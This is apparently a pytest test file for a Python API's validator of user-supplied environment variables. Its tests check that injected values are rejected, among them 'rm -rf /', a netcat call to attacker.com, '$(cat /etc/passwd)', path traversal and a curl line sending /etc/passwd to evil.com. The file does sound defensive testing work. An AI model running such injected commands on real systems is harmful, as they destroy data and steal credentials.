# SPDX-License-Identifier: Apache-2.0.
# Copyright (c) 2024 - 2025 Waldiez and contributors.
# pylint: disable=missing-function-docstring,missing-module-docstring
# pylint: disable=too-many-public-methods,no-self-use

"""Test waldiez_runner.routes.v1._env_vars.*."""

import json
from typing import Any

import pytest
from fastapi import HTTPException

from waldiez_runner.routes.v1.env_vars import get_env_vars


class TestGetEnvVars:
    """Test the get_env_vars function."""

    def test_get_env_vars_none_input(self) -> None:
        """Test with None input returns empty dict."""
        result = get_env_vars(None)
        assert result == {}

    def test_get_env_vars_empty_string(self) -> None:
        """Test with empty string returns empty dict."""
        result = get_env_vars("")
        assert result == {}

    def test_get_env_vars_valid_input(self) -> None:
        """Test with valid environment variables."""
        env_vars = json.dumps(
            {
                "API_KEY": "secret123",
                "DATABASE_URL": "postgresql://localhost/myapp",
                "LOG_LEVEL": "DEBUG",
                "MAX_WORKERS": "4",
            }
        )

        result = get_env_vars(env_vars)

        expected = {
            "API_KEY": "secret123",
            "DATABASE_URL": "postgresql://localhost/myapp",
            "LOG_LEVEL": "DEBUG",
            "MAX_WORKERS": "4",
        }
        assert result == expected

    def test_get_env_vars_json_too_large(self) -> None:
        """Test JSON string exceeding size limit."""
        # Create a JSON string larger than MAX_ENV_VARS_JSON_SIZE (5000 bytes)
        # Use many small variables to exceed JSON
        # size without hitting value length limit
        many_vars = {
            f"VAR_{i:03d}": f"value_{i}" for i in range(200)
        }  # ~4KB of vars
        base_json = json.dumps(many_vars)

        # Add padding to exceed the 5KB limit
        padding_needed = 5001 - len(base_json)
        if padding_needed > 0:
            # Add one more variable with enough padding
            many_vars["PADDING_VAR"] = "x" * min(
                padding_needed, 499
            )  # Stay under value limit
            env_vars = json.dumps(many_vars)
        else:
            env_vars = base_json

        # Ensure we actually exceeded the size limit
        assert len(env_vars) > 5000

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert "exceeds" in exc_info.value.detail
        assert "bytes" in exc_info.value.detail

    def test_get_env_vars_invalid_json(self) -> None:
        """Test with invalid JSON format."""
        invalid_json = '{"key": "value", "missing_quote: "value2"}'

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(invalid_json)

        assert exc_info.value.status_code == 400
        assert "Invalid JSON format for env_vars" in exc_info.value.detail

    def test_get_env_vars_not_dict(self) -> None:
        """Test with JSON that's not a dictionary."""
        non_dict_json = json.dumps(["not", "a", "dict"])

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(non_dict_json)

        assert exc_info.value.status_code == 400
        assert "env_vars must be a JSON object" in exc_info.value.detail

    def test_get_env_vars_too_many_items(self) -> None:
        """Test with too many environment variables."""
        # Create more than MAX_ENV_VARS_COUNT items
        many_vars = {f"VAR_{i}": f"value_{i}" for i in range(45)}
        env_vars = json.dumps(many_vars)

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert "exceeds" in exc_info.value.detail
        assert "items" in exc_info.value.detail

    def test_get_env_vars_protected_variable_uppercase(self) -> None:
        """Test blocking protected system variables (uppercase)."""
        env_vars = json.dumps({"PATH": "/malicious/path"})

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert (
            "Cannot override protected system variable: PATH"
            in exc_info.value.detail
        )

    def test_get_env_vars_protected_variable_lowercase(self) -> None:
        """Test blocking protected system variables (lowercase)."""
        env_vars = json.dumps({"path": "/malicious/path"})

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert (
            "Cannot override protected system variable: path"
            in exc_info.value.detail
        )

    def test_get_env_vars_protected_variable_mixed_case(self) -> None:
        """Test blocking protected system variables (mixed case)."""
        env_vars = json.dumps({"Http_Proxy": "http://evil.com"})

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert (
            "Cannot override protected system variable: Http_Proxy"
            in exc_info.value.detail
        )

    def test_get_env_vars_key_too_long(self) -> None:
        """Test environment variable key exceeding length limit."""
        long_key = "A" * 60  # Assuming MAX_ENV_KEY_LENGTH = 50
        env_vars = json.dumps({long_key: "value"})

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert f"env_vars key '{long_key}'" in exc_info.value.detail
        assert "exceeds" in exc_info.value.detail

    def test_get_env_vars_value_too_long(self) -> None:
        """Test environment variable value exceeding length limit."""
        long_value = "x" * 600  # Assuming MAX_ENV_VALUE_LENGTH = 500
        env_vars = json.dumps({"TEST_KEY": long_value})

        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert "env_vars value for key 'TEST_KEY'" in exc_info.value.detail
        assert "exceeds" in exc_info.value.detail

    def test_get_env_vars_unsafe_key_characters(self) -> None:
        """Test environment variable key with unsafe characters."""
        test_cases = [
            "key-with-dash",
            "key.with.dots",
            "key with spaces",
            "key@symbol",
            "123_starts_with_number",
        ]

        for unsafe_key in test_cases:
            env_vars = json.dumps({unsafe_key: "value"})

            with pytest.raises(HTTPException) as exc_info:
                get_env_vars(env_vars)

            assert exc_info.value.status_code == 400
            assert (
                f"env_vars key '{unsafe_key}' contains unsafe characters"
                in exc_info.value.detail
            )

    def test_get_env_vars_safe_key_characters(self) -> None:
        """Test environment variable keys with safe characters."""
        safe_keys = [
            "API_KEY",
            "DATABASE_URL",
            "LOG_LEVEL",
            "_PRIVATE_VAR",
            "VAR123",
            "a_valid_key",
        ]

        env_dict = {key: "safe_value" for key in safe_keys}
        env_vars = json.dumps(env_dict)

        result = get_env_vars(env_vars)
        assert result == env_dict

    def test_get_env_vars_unsafe_value_shell_metacharacters(self) -> None:
        """Test values with shell metacharacters."""
        dangerous_values = [
            "value; rm -rf /",
            "value && evil_command",
            "value | nc attacker.com 1234",
            "value `whoami`",
            "value $(cat /etc/passwd)",
            "value {dangerous}",
            "value (subprocess)",
        ]

        for dangerous_value in dangerous_values:
            env_vars = json.dumps({"TEST_KEY": dangerous_value})

            with pytest.raises(HTTPException) as exc_info:
                get_env_vars(env_vars)

            assert exc_info.value.status_code == 400
            assert (
                "env_vars value for key 'TEST_KEY' contains unsafe characters"
                in exc_info.value.detail
            )

    def test_get_env_vars_unsafe_value_path_traversal(self) -> None:
        """Test values with path traversal attempts."""
        traversal_values = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\cmd.exe",
            "legitimate/path/../../../etc/shadow",
        ]

        for traversal_value in traversal_values:
            env_vars = json.dumps({"TEST_KEY": traversal_value})

            with pytest.raises(HTTPException) as exc_info:
                get_env_vars(env_vars)

            assert exc_info.value.status_code == 400
            assert "unsafe characters" in exc_info.value.detail

    def test_get_env_vars_unsafe_value_urls(self) -> None:
        """Test values with URLs (potential data exfiltration)."""
        url_values = [
            "http://evil.com/steal",
            "https://attacker.com/exfiltrate",
            "ftp://malicious.org/upload",
        ]

        for url_value in url_values:
            env_vars = json.dumps({"TEST_KEY": url_value})

            with pytest.raises(HTTPException) as exc_info:
                get_env_vars(env_vars)

            assert exc_info.value.status_code == 400
            assert "unsafe characters" in exc_info.value.detail

    def test_get_env_vars_unsafe_value_encoding(self) -> None:
        """Test values with hex/URL encoding."""
        encoded_values = [
            "\\x41\\x42\\x43",  # Hex encoding
            "%41%42%43",  # URL encoding
            "value%20with%20encoding",
        ]

        for encoded_value in encoded_values:
            env_vars = json.dumps({"TEST_KEY": encoded_value})

            with pytest.raises(HTTPException) as exc_info:
                get_env_vars(env_vars)

            assert exc_info.value.status_code == 400
            assert "unsafe characters" in exc_info.value.detail

    def test_get_env_vars_non_string_key(self) -> None:
        """Test with non-string keys in JSON."""
        # JSON with numeric key
        env_vars = '{"123": "value"}'  # Numeric key as string in JSON

        # This should pass format validation but
        # potentially fail pattern validation
        with pytest.raises(HTTPException) as exc_info:
            get_env_vars(env_vars)

        assert exc_info.value.status_code == 400
        assert "unsafe characters" in exc_info.value.detail

    def test_get_env_vars_non_string_value(self) -> None:
        """Test with non-string values in JSON."""
        # Create JSON with non-string values
        env_data: dict[str, Any] = {
            "STRING_KEY": "string_value",
            "NUMERIC_KEY": 123,
        }
        env_vars = json.dumps(env_data)

        # Should convert to strings successfully
        result = get_env_vars(env_vars)
        assert result == {"STRING_KEY": "string_value", "NUMERIC_KEY": "123"}

    def test_get_env_vars_edge_cases_valid(self) -> None:
        """Test edge cases that should be valid."""
        valid_cases = [
            # Single character key
            '{"A": "value"}',
            # Underscore-only key
            '{"_": "value"}',
            # Mixed case
            '{"Api_Key": "value"}',
            # Numbers in key
            '{"API_V2_KEY": "value"}',
            # Empty value
            '{"EMPTY_VAR": ""}',
        ]

        for case in valid_cases:
            result = get_env_vars(case)
            assert isinstance(result, dict)
            assert len(result) == 1

    def test_get_env_vars_boundary_conditions(self) -> None:
        """Test boundary conditions for size limits."""
        # Test maximum allowed key length (50 chars)
        max_key = "A" * 50
        env_vars = json.dumps({max_key: "value"})
        result = get_env_vars(env_vars)
        assert max_key in result

        # Test maximum allowed value length (500 chars)
        max_value = "x" * 500
        env_vars = json.dumps({"TEST_KEY": max_value})
        result = get_env_vars(env_vars)
        assert result["TEST_KEY"] == max_value

        # Test maximum allowed count (20 items)
        max_vars = {f"VAR_{i:02d}": f"value_{i}" for i in range(20)}
        env_vars = json.dumps(max_vars)
        result = get_env_vars(env_vars)
        assert len(result) == 20

    def test_get_env_vars_real_world_examples(self) -> None:
        """Test with realistic environment variable examples."""
        real_world_vars = {
            "DATABASE_URL": "postgresql://user:pass@localhost:5432/dbname",
            "REDIS_URL": "redis://localhost:6379/0",
            "LOG_LEVEL": "INFO",
            "DEBUG_MODE": "false",
            "MAX_CONNECTIONS": "100",
            "TIMEOUT_SECONDS": "30",
            "FEATURE_FLAG_BETA": "enabled",
            "API_VERSION": "v2",
            "ENVIRONMENT": "production",
            "WORKER_PROCESSES": "4",
        }

        env_vars = json.dumps(real_world_vars)
        result = get_env_vars(env_vars)

        assert result == real_world_vars

    def test_get_env_vars_type_conversion(self) -> None:
        """Test that all values are converted to strings."""
        mixed_types: dict[str, Any] = {
            "STRING_VAR": "text",
            "INT_VAR": 42,
            "FLOAT_VAR": 3.14,
            "BOOL_VAR": True,
            "NULL_VAR": None,
        }

        env_vars = json.dumps(mixed_types)
        result = get_env_vars(env_vars)

        expected = {
            "STRING_VAR": "text",
            "INT_VAR": "42",
            "FLOAT_VAR": "3.14",
            "BOOL_VAR": "True",
            "NULL_VAR": "None",
        }
        assert result == expected

    def test_get_env_vars_comprehensive_protected_vars(self) -> None:
        """Test all categories of protected environment variables."""
        protected_test_cases = [
            # System paths
            ("PATH", "/evil/bin"),
            ("PYTHONPATH", "/malicious/modules"),
            ("LD_LIBRARY_PATH", "/bad/libs"),
            # User/system info
            ("HOME", "/fake/home"),
            ("USER", "fakeuser"),
            ("SHELL", "/bin/evil"),
            # Network/proxy
            ("HTTP_PROXY", "http://evil.com"),
            ("https_proxy", "https://attacker.com"),
            ("ALL_PROXY", "socks5://malicious.org"),
            # Temp directories
            ("TMPDIR", "/evil/tmp"),
            ("TEMP", "C:\\evil\\temp"),
            # Python-specific
            ("PYTHONHOME", "/fake/python"),
            ("PYTHONSTARTUP", "/evil/startup.py"),
        ]

        for protected_var, malicious_value in protected_test_cases:
            env_vars = json.dumps({protected_var: malicious_value})

            with pytest.raises(HTTPException) as exc_info:
                get_env_vars(env_vars)

            assert exc_info.value.status_code == 400
            assert (
                "Cannot override protected system variable"
                in exc_info.value.detail
            )
            assert protected_var in exc_info.value.detail

    def test_get_env_vars_performance_with_max_load(self) -> None:
        """Test performance with maximum allowed load."""
        max_vars: dict[str, str] = {}
        # pylint: disable=inconsistent-quotes
        for i in range(20):
            key = f"VAR_{'A' * 35}_{i:02d}"
            value = "x" * 200
            max_vars[key] = value

        env_vars = json.dumps(max_vars)

        # Should complete without error
        result = get_env_vars(env_vars)
        assert len(result) == 20
        assert all(len(k) <= 50 for k in result.keys())
        assert all(len(v) <= 500 for v in result.values())

    def test_get_env_vars_malicious_combinations(self) -> None:
        """Test combinations of malicious patterns."""
        malicious_combinations = [
            # Command injection + path traversal
            {"EVIL_VAR": "../../bin/sh; rm -rf /"},
            # URL + shell metacharacters
            {"BAD_URL": "http://evil.com/$(whoami)"},
            # Encoding + shell injection
            {"ENCODED_EVIL": "%2e%2e%2f%62%69%6e%2f%73%68; evil"},
            # Mixed attack patterns
            # pylint: disable=line-too-long
            {
                "COMPLEX_ATTACK": "value && curl http://evil.com/steal?data=$(cat /etc/passwd)"  # noqa: E501
            },
        ]

        for malicious_dict in malicious_combinations:
            env_vars = json.dumps(malicious_dict)

            with pytest.raises(HTTPException) as exc_info:
                get_env_vars(env_vars)

            assert exc_info.value.status_code == 400
            assert "unsafe characters" in exc_info.value.detail

    def test_get_env_vars_safe_values_with_special_chars(self) -> None:
        """Test legitimate values with special characters but safe."""
        # These should be allowed (no shell metacharacters, no URLs, etc.)
        safe_special_values = {
            "DATABASE_DSN": "user:password@localhost:5432/database_name",
            "JWT_SECRET": "abc123_secret-key.with-dashes",  # nosemgrep # nosec
            "FILE_PATH": "/app/data/file.txt",  # Absolute without traversal
            "EMAIL": "user@example.com",
            "PERCENTAGE": "75%",  # Single % not URL encoding pattern
            "VERSION": "1.2.3",
            "DASH_VALUE": "some-value-with-dashes",
        }

        env_vars = json.dumps(safe_special_values)
        result = get_env_vars(env_vars)

        # Should pass validation
        assert result == safe_special_values
